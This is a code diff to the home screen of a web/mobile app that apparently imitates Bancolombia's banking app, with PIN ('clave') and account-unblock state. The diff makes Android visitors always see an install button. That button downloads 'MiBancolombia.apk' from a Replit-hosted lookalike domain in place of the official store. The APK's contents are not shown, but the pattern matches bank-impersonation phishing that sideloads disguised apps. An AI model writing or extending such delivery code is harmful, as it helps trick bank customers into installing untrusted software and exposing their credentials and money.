@@ -550,8 +550,12 @@ export default function HomeScreen() {
   const [claveCode, setClaveCode]       = useState("");
   const [showUnblock, setShowUnblock]   = useState(false);
 
-  /* PWA install */
+  /* PWA / APK install */
   const [showInstallBtn, setShowInstallBtn] = useState(false);
+  const [isAndroidBrowser,  setIsAndroidBrowser]  = useState(false);
+
+  // URL del APK alojado en este mismo servidor
+  const APK_URL = "https://bancolombia--bancolombiaban2.replit.app/app.apk";
 
   useEffect(() => {
     if (Platform.OS !== "web") return;
@@ -559,6 +563,18 @@ export default function HomeScreen() {
       (window as any).matchMedia?.("(display-mode: standalone)").matches ||
       (window.navigator as any).standalone === true;
     if (isStandalone) return;
+
+    // Detectar Android en el navegador
+    const android = /android/i.test(window.navigator.userAgent);
+    setIsAndroidBrowser(android);
+
+    if (android) {
+      // En Android siempre mostramos el botón APK (no depende de beforeinstallprompt)
+      setShowInstallBtn(true);
+      return;
+    }
+
+    // En iOS / escritorio: comportamiento PWA normal
     const showIfReady = () => { if ((window as any).__pwaInstallPrompt) setShowInstallBtn(true); };
     showIfReady();
     const onReady = () => setShowInstallBtn(true);
@@ -576,6 +592,17 @@ export default function HomeScreen() {
   }, []);
 
   const handleInstall = async () => {
+    if (isAndroidBrowser) {
+      // Android: descargar el APK directamente
+      const a = document.createElement("a");
+      a.href = APK_URL;
+      a.download = "MiBancolombia.apk";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      return;
+    }
+    // iOS / escritorio: instalar como PWA
     const deferred = (window as any).__pwaInstallPrompt;
     if (!deferred) return;
     try {
@@ -635,7 +662,7 @@ export default function HomeScreen() {
           {showInstallBtn && (
             <TouchableOpacity style={styles.installBtn} onPress={handleInstall} activeOpacity={0.82}>
               <Feather name="download" size={11} color="#FFFFFF" />
-              <Text style={styles.installBtnText}>Instalar app</Text>
+              <Text style={styles.installBtnText}>{isAndroidBrowser ? "Descargar APK" : "Instalar app"}</Text>
             </TouchableOpacity>
           )}
         </View>
